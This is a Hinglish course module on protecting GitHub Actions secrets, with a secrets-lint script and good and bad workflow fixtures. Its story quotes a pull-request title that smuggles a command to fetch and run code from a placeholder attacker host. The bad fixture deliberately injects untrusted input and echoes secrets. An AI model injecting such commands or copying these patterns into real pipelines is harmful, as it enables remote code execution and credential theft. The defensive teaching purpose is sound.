# Containerization & CI-CD

## Managing GitHub secrets

> Core | Fast CP4 / Slow CP6 | ~1.2 h | Builds on: M04-09, M04-10, M01-15, M12-09

### Kahani
Retail customer ke public repo pe ek contributor ka PR aaya. PR title tha: `fix"; curl -s attacker.example/x | sh; echo "`. Workflow mein step tha `run: echo "PR: ${{ github.event.pull_request.title }}"` -- title seedha shell mein chala.
Usi repo mein `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` repo secrets the, admin policy ke saath, 2 saal purane. Ek debug step ne key ko `base64` karke print kiya tha -- GitHub ne mask nahi kiya, kyunki masked value original string thi, base64 nahi.
Secrets store karna aasaan hai; unhe leak hone se bachana engineering hai.

### What it is
**GitHub secrets** = encrypted values (repo, **environment** ya organization level) jo workflow mein `${{ secrets.NAME }}` se milte hain aur logs mein `***` mask hote hain. **Variables** (`${{ vars.NAME }}`) non-secret config ke liye.
**Environments** (`production`) pe protection rules: required reviewers, sirf `main` branch se deploy -- aur environment secrets sirf us job ko milte hain jo `environment: production` declare kare.

### Why it matters for an FDE
Customer ka CI aapke laptop se zyada exposed hai: forks, PRs, third-party actions. Ek leaked cloud key = incident report + customer ka trust gaya. Best secret woh hai jo store hi na ho -- AWS ke liye OIDC (M04-12).

### Key concepts
- **Environment secrets + reviewers** -- prod secrets sirf approved deploy job ko; PR jobs ko kabhi nahi.
- **Pass via env, not inline** -- `env: {KEY: ${{ secrets.KEY }}}` phir `"$KEY"`; `${{ }}` ko `run:` ke andar interpolate mat karo.
- **Untrusted input injection** -- `github.event.pull_request.title/body`, `head_ref` attacker-controlled; `run:` mein seedha = shell injection.
- **Masking limits** -- sirf exact value mask hoti hai; transformed (base64, JSON slice) value leak ho sakti hai.
- **Forks + pull_request_target** -- fork PR ko secrets nahi milte (achha); `pull_request_target` deta hai, isliye usme PR ka code checkout karna dangerous.

### Code example
`pip install pyyaml`

```yaml
jobs:
  smoke:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    environment: production
    permissions: {contents: read}
    steps:
      - name: Call the deployed API with a key from the environment secret
        env:
          OMNIGUARD_API_KEY: ${{ secrets.OMNIGUARD_API_KEY }}
          PR_TITLE: ${{ github.event.pull_request.title }}
          BASE_URL: ${{ vars.OMNIGUARD_BASE_URL }}
        run: |
          curl -fsS -H "x-api-key: $OMNIGUARD_API_KEY" "$BASE_URL/readyz"
```

```python
# runnable
import base64
import re
import yaml

HARDCODED = re.compile(r"AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,}")
UNTRUSTED = re.compile(r"\$\{\{\s*github\.(event\.(pull_request|issue|comment)\.(title|body)|head_ref)")
SECRET_EXPR = re.compile(r"\$\{\{\s*secrets\.(\w+)\s*\}\}")

def lint_secrets(text: str) -> list[str]:
    errs = [f"hardcoded credential: {m.group(0)[:8]}..." for m in HARDCODED.finditer(text)]
    wf = yaml.safe_load(text)
    on = wf.get("on", wf.get(True)) or {}               # PyYAML: `on` -> True (M04-09)
    for name, job in wf.get("jobs", {}).items():
        uses_secrets = SECRET_EXPR.search(yaml.safe_dump(job))
        if uses_secrets and not job.get("environment"):
            errs.append(f"{name}: uses secrets without an environment (no protection rules)")
        for step in job.get("steps", []):
            run = step.get("run", "")
            if SECRET_EXPR.search(run):
                errs.append(f"{name}: secret interpolated inside run (pass via env)")
            if UNTRUSTED.search(run):
                errs.append(f"{name}: untrusted github.event input inside run (script injection)")
            env = step.get("env", {})
            secret_envs = {k for k, v in env.items() if SECRET_EXPR.search(str(v))}
            if {"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"} & (secret_envs | set(env)):
                errs.append(f"{name}: long-lived AWS keys (use OIDC role, M04-12)")
            for k in secret_envs:
                if re.search(rf"echo[^\n]*\${k}\b", run):
                    errs.append(f"{name}: echoes secret env {k}")
            ref = str((step.get("with") or {}).get("ref", ""))
            if "pull_request_target" in on and "head" in ref:
                errs.append(f"{name}: checks out PR head code under pull_request_target")
    return errs

def gh_mask(log: str, secrets: list[str]) -> str:
    for s in secrets:                                    # GitHub masks the exact registered value
        log = log.replace(s, "***")
    return log

GOOD = """
on: {push: {branches: [main]}}
jobs:
  smoke:
    environment: production
    steps:
      - env: {OMNIGUARD_API_KEY: "${{ secrets.OMNIGUARD_API_KEY }}", PR_TITLE: "${{ github.event.pull_request.title }}"}
        run: 'curl -fsS -H "x-api-key: $OMNIGUARD_API_KEY" "$BASE_URL/readyz"'
"""
BAD = """
on: {pull_request_target: {}}
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: {ref: "${{ github.event.pull_request.head.sha }}"}
      - env: {AWS_ACCESS_KEY_ID: "${{ secrets.AWS_ACCESS_KEY_ID }}", LLM_KEY: "${{ secrets.LLM_KEY }}"}
        run: |
          echo "PR: ${{ github.event.pull_request.title }}"
          echo "debug $LLM_KEY"
          deploy --token ${{ secrets.DEPLOY_TOKEN }} --fallback-key AKIAIOSFODNN7EXAMPLE
"""

assert lint_secrets(GOOD) == [], lint_secrets(GOOD)
bad = lint_secrets(BAD)
for e in bad:
    print("BAD :", e)
for needle in ["hardcoded", "without an environment", "inside run (pass", "script injection",
               "long-lived AWS", "echoes secret env LLM_KEY", "PR head code"]:
    assert any(needle in e for e in bad), needle

secret = "sk-test-not-a-real-key-123456"                 # fake value, never a real key
log = f"token={secret}\nencoded={base64.b64encode(secret.encode()).decode()}"
masked = gh_mask(log, [secret])
print(masked)
assert secret not in masked and "***" in masked
assert base64.b64encode(secret.encode()).decode() in masked   # transformed value is NOT masked
print("OK:", len(bad), "secret-handling problems found; masking limit shown")
```

- `PR_TITLE` GOOD mein `env:` ke through hai -- shell use variable ki tarah dekhta hai, code ki tarah nahi. Wahi value `run:` mein inline = injection.
- `uses secrets without an environment` -- environment hai to required reviewers + branch rules lagte hain; bina uske koi bhi branch ka job secret padh sakta hai.
- `long-lived AWS keys` -- M04-12 mein OIDC se replace karenge; GitHub mein koi AWS key store hi nahi hogi.
- `gh_mask` -- GitHub ke masking ka simple model: exact match. Base64 version log mein saaf dikhta hai -- isliye secrets ko transform karke kabhi print mat karo; transformed value ko `::add-mask::` se register kar sakte ho.
- Real repo mein ye checks `zizmor` ya `actionlint` jaise tools bhi karte hain -- CI mein ek add karo.

```bash
# run later on your own machine -- GitHub CLI logged in; values are typed at the prompt, never in shell history
gh secret set OMNIGUARD_API_KEY --env production
gh variable set OMNIGUARD_BASE_URL --env production --body "https://omniguard.example.com"
gh secret list --env production
```

### Mini-exercise (30-60 min)
OmniGuard repo:
- GitHub pe `production` environment banao: required reviewer = aap, deployment branches = `main` only.
- `OMNIGUARD_API_KEY` (fake demo value) environment secret, `OMNIGUARD_BASE_URL` environment variable.
- `.github/workflows/smoke.yml` -- `workflow_dispatch` pe deployed `/readyz` call kare (abhi URL placeholder; M04-12 ke baad real).
- `tools/lint_secrets.py` + test -- saari workflow files clean; BAD fixture pe 7 findings.
- Acceptance: smoke job approval ke liye rukta hai; log mein key `***` dikhti hai.

### Common pitfalls
- JSON blob ek secret mein -- multi-line/structured value ke parts mask nahi hote; har value alag secret rakho.
- Secret rotate kiya par purani ECS task revision ab bhi purani value use kar rahi hai -- rotation ke baad redeploy plan karo.
- `ACTIONS_STEP_DEBUG` on chhod dena -- debug logs zyada context dikhate hain; kaam ke baad band karo.

### Checklist before moving on
- [ ] Prod secrets sirf environment level pe, reviewers ke saath.
- [ ] Kahin bhi `${{ secrets.* }}` ya `github.event.*` seedha `run:` ke andar nahi.
- [ ] Repo mein koi AWS access key secret nahi (OIDC next lesson).
- [ ] Masking ki limit (transformed values) samjha sakte ho.

### Related
- M04-09 Creating workflow YAML files
- M04-12 Continuous deployment to AWS
- M12-09 API keys vs service accounts
- M13-14 Safe logging (never log PII or prompts)
- M01-15 Environment variable configurations

### Self-quiz
1. `run: echo "${{ github.event.pull_request.title }}"` dangerous kyun hai, aur same value safe tarike se kaise use karoge?
2. Repo secret vs environment secret -- prod deploy key kahan rakhoge aur kyun?
3. Secret logs mein `***` dikhta hai, phir bhi leak kaise ho sakta hai? Do tarike batao.
4. `pull_request` aur `pull_request_target` mein secrets ke hisaab se kya farak hai?
